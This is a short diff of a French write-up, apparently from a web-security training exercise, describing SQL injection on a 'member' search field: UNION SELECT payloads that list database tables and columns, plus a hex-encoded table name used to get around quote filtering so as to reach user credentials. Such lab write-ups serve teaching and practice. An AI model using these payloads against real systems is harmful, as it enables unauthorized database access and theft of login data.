@@ -1,9 +1,10 @@
 
 On display les informations concernant la base de donnée SQL grace a information_schema.tables
 
-cmd : 1 union select table_schema,table_name from information_schema.tables
+Dans la barre de recherche de la page 'member':
+1 union select table_schema,table_name from information_schema.tables
 
-On voit qu'il existe une table users, il faut maintenant récupéré la value des columns pour trouver un couple identifiant/mot de passe, l'input de member n'accepte que les requetes qui ne demande que 2 valeur. Pour contrer la sécurité sur les quotes qui nous empêche de demander directement la table users on convertit le nom de la table en hexa.
+On voit qu'il existe une table users, il faut maintenant récupérer la value des columns pour trouver un couple identifiant/mot de passe, l'input de member n'accepte que les requetes qui ne demandent que 2 valeurs. Pour contrer la sécurité sur les quotes qui nous empêche de demander directement la table users on convertit le nom de la table en hexa.
 
 1 union select null,group_concat(column_name) from information_schema.columns where table_name = 0x7573657273 # (0x7573657273 == users en hexa seul moyen pour que table_name accept l'input)
 
